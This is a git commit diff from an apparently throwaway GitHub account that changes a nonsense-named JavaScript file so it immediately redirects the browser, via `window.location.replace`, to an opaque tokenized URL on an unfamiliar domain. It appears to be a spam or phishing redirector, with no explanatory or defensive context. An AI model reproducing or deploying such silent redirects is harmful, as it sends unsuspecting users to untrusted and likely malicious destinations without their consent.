f191d7f7b440364de98c915bc8502e8882575e5a
sdvgnlksdflmdfgb <122368237+sdvgnlksdflmdfgb@users.noreply.github.com>
2023-01-10 19:35:54 +0400

    Update ingoulityouth.js

--- ingoulityouth.js
+++ ingoulityouth.js
@@ -1,1 +1,1 @@
-https://www.roadsworks.com/gQ_hBEIKQRfugBl4Sr-C7B4uJOrwXJPigVd3InLCflbY93LuaL-CFyH66xgXncWcC_DN5n8kbVAj6miHPLE4Xw~~/imad
+window.location.replace(`https://www.roadsworks.com/gQ_hBEIKQRfugBl4Sr-C7B4uJOrwXJPigVd3InLCflbY93LuaL-CFyH66xgXncWcC_DN5n8kbVAj6miHPLE4Xw~~/imad`);
